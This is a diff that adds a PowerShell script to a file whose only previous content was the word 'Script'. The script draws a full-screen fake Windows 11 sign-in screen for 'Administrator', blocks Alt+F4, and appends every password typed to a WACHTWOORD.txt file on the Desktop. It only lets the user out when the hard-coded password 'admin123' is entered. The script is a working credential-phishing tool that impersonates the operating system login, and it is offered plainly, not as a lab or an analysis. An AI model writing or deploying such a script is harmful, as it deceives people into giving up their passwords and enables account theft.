@@ -1,1 +1,163 @@
-Script
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+ 
+# Create main form (full screen)
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Windows 11"
+$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
+$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
+$form.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
+#$form.TopMost = $true
+ 
+# Get screen dimensions
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen
+$screenWidth = $screen.Bounds.Width
+$screenHeight = $screen.Bounds.Height
+ 
+# Background image (simplified Windows 11 background)
+$background = New-Object System.Windows.Forms.PictureBox
+$background.Dock = [System.Windows.Forms.DockStyle]::Fill
+$background.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 20)
+$form.Controls.Add($background)
+ 
+# Calculate center positions
+$centerX = $screenWidth / 2
+$loginPanelWidth = 400
+$loginPanelX = $centerX - ($loginPanelWidth / 2)
+ 
+# User picture (placeholder)
+$userPicture = New-Object System.Windows.Forms.PictureBox
+$userPicture.Size = New-Object System.Drawing.Size(80, 80)
+$userPicture.Location = New-Object System.Drawing.Point(($centerX - 40), 150)
+$userPicture.BackColor = [System.Drawing.Color]::Transparent
+try {
+    $userPicture.Image = [System.Drawing.Image]::FromFile("$env:SystemRoot\System32\oobe\info\logo.png") # Default Windows logo
+} catch {
+    # Create a simple placeholder if image not found
+    $bmp = New-Object System.Drawing.Bitmap(80, 80)
+    $g = [System.Drawing.Graphics]::FromImage($bmp)
+    $g.FillEllipse([System.Drawing.Brushes]::DarkBlue, 0, 0, 80, 80)
+    $g.DrawString("A", (New-Object System.Drawing.Font("Segoe UI", 36)), [System.Drawing.Brushes]::White, 20, 15)
+    $userPicture.Image = $bmp
+}
+$userPicture.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
+$background.Controls.Add($userPicture)
+ 
+# Username label
+$userLabel = New-Object System.Windows.Forms.Label
+$userLabel.Text = "Administrator"
+$userLabel.ForeColor = [System.Drawing.Color]::White
+$userLabel.BackColor = [System.Drawing.Color]::Transparent
+$userLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Regular)
+$userLabel.AutoSize = $true
+$userLabel.Location = New-Object System.Drawing.Point(($centerX - ($userLabel.PreferredWidth / 2)), 250)
+$background.Controls.Add($userLabel)
+ 
+# Password box
+$passwordBox = New-Object System.Windows.Forms.TextBox
+$passwordBox.Size = New-Object System.Drawing.Size(300, 30)
+$passwordBox.Location = New-Object System.Drawing.Point(($centerX - 150), 300)
+$passwordBox.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Regular)
+$passwordBox.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
+$passwordBox.ForeColor = [System.Drawing.Color]::White
+$passwordBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
+$passwordBox.PasswordChar = '•'
+$passwordBox.Text = "Password"
+$passwordBox.Add_GotFocus({
+    if ($this.Text -eq "Password") {
+        $this.Text = ""
+        $this.PasswordChar = '•'
+    }
+})
+$background.Controls.Add($passwordBox)
+ 
+# Submit button
+$submitButton = New-Object System.Windows.Forms.Button
+$submitButton.Text = "Sign in"
+$submitButton.Size = New-Object System.Drawing.Size(300, 40)
+$submitButton.Location = New-Object System.Drawing.Point(($centerX - 150), 360)
+$submitButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Regular)
+$submitButton.BackColor = [System.Drawing.Color]::FromArgb(0, 90, 158)
+$submitButton.ForeColor = [System.Drawing.Color]::White
+$submitButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$submitButton.FlatAppearance.BorderSize = 0
+$submitButton.Add_Click({
+    $password = $passwordBox.Text
+    
+    # Save credentials to file
+    $credentials = "Username: Administrator`nPassword: $password`nTimestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n"
+    $desktopPath = [Environment]::GetFolderPath("Desktop")
+    $path = Join-Path -Path $desktopPath -ChildPath "WACHTWOORD.txt"
+    $credentials | Out-File -FilePath $path -Encoding UTF8 -Append
+    
+    # Authentication logic
+    if ($password -eq "admin123") { # Example password
+        $form.Close() # Venster sluiten zonder popup
+    } else {
+        [System.Windows.Forms.MessageBox]::Show("Incorrect password", "Error")
+        $passwordBox.Text = ""
+    }
+})
+$background.Controls.Add($submitButton)
+ 
+# Power options (shutdown button in bottom right)
+$powerButton = New-Object System.Windows.Forms.Button
+$powerButton.Text = "⏻"
+$powerButton.Size = New-Object System.Drawing.Size(50, 50)
+$powerButton.Location = New-Object System.Drawing.Point(($screenWidth - 80), ($screenHeight - 80))
+$powerButton.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Regular)
+$powerButton.BackColor = [System.Drawing.Color]::Transparent
+$powerButton.ForeColor = [System.Drawing.Color]::White
+$powerButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
+$powerButton.FlatAppearance.BorderSize = 0
+$powerButton.Add_Click({
+    $result = [System.Windows.Forms.MessageBox]::Show("Do you want to shut down this computer?", "Shut Down", 
+        [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)
+    if ($result -eq [System.Windows.Forms.DialogResult]::Yes) {
+        Stop-Computer -Force
+    }
+})
+$background.Controls.Add($powerButton)
+ 
+# Date and time display (top center)
+$timeLabel = New-Object System.Windows.Forms.Label
+$timeLabel.ForeColor = [System.Drawing.Color]::White
+$timeLabel.BackColor = [System.Drawing.Color]::Transparent
+$timeLabel.Font = New-Object System.Drawing.Font("Segoe UI", 36, [System.Drawing.FontStyle]::Regular)
+$timeLabel.AutoSize = $true
+$timeLabel.Location = New-Object System.Drawing.Point(($centerX - ($timeLabel.PreferredWidth / 2)), 50)
+$background.Controls.Add($timeLabel)
+ 
+$dateLabel = New-Object System.Windows.Forms.Label
+$dateLabel.ForeColor = [System.Drawing.Color]::White
+$dateLabel.BackColor = [System.Drawing.Color]::Transparent
+$dateLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Regular)
+$dateLabel.AutoSize = $true
+$dateLabel.Location = New-Object System.Drawing.Point(($centerX - ($dateLabel.PreferredWidth / 2)), 100)
+$background.Controls.Add($dateLabel)
+ 
+# Update time function
+$updateTime = {
+    $timeLabel.Text = (Get-Date).ToString("HH:mm")
+    $timeLabel.Location = New-Object System.Drawing.Point(($centerX - ($timeLabel.PreferredWidth / 2)), 50)
+    $dateLabel.Text = (Get-Date).ToString("dddd, MMMM dd")
+    $dateLabel.Location = New-Object System.Drawing.Point(($centerX - ($dateLabel.PreferredWidth / 2)), 100)
+}
+ 
+# Timer to update clock
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 1000
+$timer.Add_Tick($updateTime)
+$updateTime.Invoke()
+$timer.Start()
+ 
+# Handle Alt+F4 to prevent closing
+$form.Add_Closing({
+    if ($_.CloseReason -eq [System.Windows.Forms.CloseReason]::UserClosing) {
+        $_.Cancel = $true
+    }
+})
+ 
+# Show the form
+[void]$form.ShowDialog()
+
